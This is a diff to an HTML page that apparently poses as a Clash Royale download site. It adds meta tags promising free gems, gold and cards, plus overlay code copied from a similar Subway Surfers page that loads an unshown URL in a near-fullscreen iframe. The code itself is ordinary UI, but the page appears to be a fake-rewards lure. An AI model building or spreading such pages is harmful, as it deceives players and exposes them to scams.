@@ -6,6 +6,14 @@
     <title>Clash Royale</title>
     <meta name="description" content="Open link in Clash Royale or download the game.">
     
+    <!-- SEO Meta Tags from Subway Surfers page -->
+    <meta name="theme-color" content="#22c55e" media="(prefers-color-scheme: light)">
+    <meta property="og:title" content="Clash Royale Rewards | Claim Your Free Rewards">
+    <meta property="og:description" content="Claim your exclusive rewards in Clash Royale! Get free gems, gold, and cards.">
+    <meta property="og:image" content="https://i.postimg.cc/HsR6qSC8/logo-opt-750.webp">
+    <meta property="og:type" content="game">
+    <meta property="og:url" content="https://modzy.site/clash-royale-rewards">
+    
     <style>
         * {
             box-sizing: border-box;
@@ -285,15 +293,16 @@
             background: rgba(255, 255, 255, 0.2);
         }
 
+        /* EXACT SAME OVERLAY STYLES FROM SUBWAY SURFERS PAGE */
         .redirect-overlay {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 85%;
-            height: 85%;
-            max-width: 1100px;
-            max-height: 800px;
+            width: 80%;
+            height: 80%;
+            max-width: 1000px;
+            max-height: 700px;
             background: white;
             border-radius: 15px;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
@@ -314,7 +323,7 @@
             right: 0;
             bottom: 0;
             background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(2px);
+            backdrop-filter: blur(4px);
             z-index: 9998;
             display: none;
         }
@@ -433,6 +442,7 @@
                 height: 20px;
             }
             
+            /* Overlay mobile adjustments */
             .redirect-overlay {
                 width: 90%;
                 height: 80%;
@@ -556,6 +566,7 @@
                 height: 18px;
             }
             
+            /* Overlay mobile adjustments */
             .redirect-overlay {
                 width: 95%;
                 height: 75%;
@@ -564,6 +575,7 @@
     </style>
 </head>
 <body>
+    <!-- EXACT SAME OVERLAY STRUCTURE FROM SUBWAY SURFERS PAGE -->
     <div class="overlay-bg" id="overlayBg"></div>
     <div class="redirect-overlay" id="redirectOverlay">
         <iframe src="" class="overlay-iframe" id="redirectFrame" allowfullscreen></iframe>
@@ -679,43 +691,48 @@
         </footer>
     </div>
 
+    <!-- EXACT SAME JAVASCRIPT FROM SUBWAY SURFERS PAGE -->
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const redirectOverlay = document.getElementById('redirectOverlay');
-            const overlayBg = document.getElementById('overlayBg');
-            const redirectFrame = document.getElementById('redirectFrame');
-            
-            function showOverlay(url) {
-                redirectFrame.src = url;
-                redirectOverlay.classList.add('active');
-                overlayBg.classList.add('active');
-                document.body.style.overflow = 'hidden';
-            }
-            
-            const mainButton = document.querySelector('.show-redirect-overlay');
-            if (mainButton) {
-                mainButton.addEventListener('click', function() {
-                    const url = this.getAttribute('data-url');
-                    showOverlay(url);
-                });
-            }
-            
-            overlayBg.addEventListener('click', function() {
+        // Redirect Overlay Functionality
+        const redirectOverlay = document.getElementById('redirectOverlay');
+        const overlayBg = document.getElementById('overlayBg');
+        const redirectFrame = document.getElementById('redirectFrame');
+        
+        function showOverlay(url) {
+            redirectFrame.src = url;
+            redirectOverlay.classList.add('active');
+            overlayBg.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        // Add event listeners to all download buttons
+        document.querySelectorAll('.show-redirect-overlay').forEach(button => {
+            button.addEventListener('click', function() {
+                const url = this.getAttribute('data-url');
+                showOverlay(url);
+            });
+        });
+        
+        // Close overlay when clicking on background
+        overlayBg.addEventListener('click', function() {
+            redirectOverlay.classList.remove('active');
+            overlayBg.classList.remove('active');
+            document.body.style.overflow = 'auto';
+            redirectFrame.src = '';
+        });
+        
+        // Close overlay with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
                 redirectOverlay.classList.remove('active');
                 overlayBg.classList.remove('active');
                 document.body.style.overflow = 'auto';
                 redirectFrame.src = '';
-            });
-            
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && redirectOverlay.classList.contains('active')) {
-                    redirectOverlay.classList.remove('active');
-                    overlayBg.classList.remove('active');
-                    document.body.style.overflow = 'auto';
-                    redirectFrame.src = '';
-                }
-            });
-            
+            }
+        });
+
+        // Original page functionality
+        document.addEventListener('DOMContentLoaded', function() {
             const langSelect = document.querySelector('.language-dropdown');
             if (langSelect) {
                 langSelect.addEventListener('change', function() {
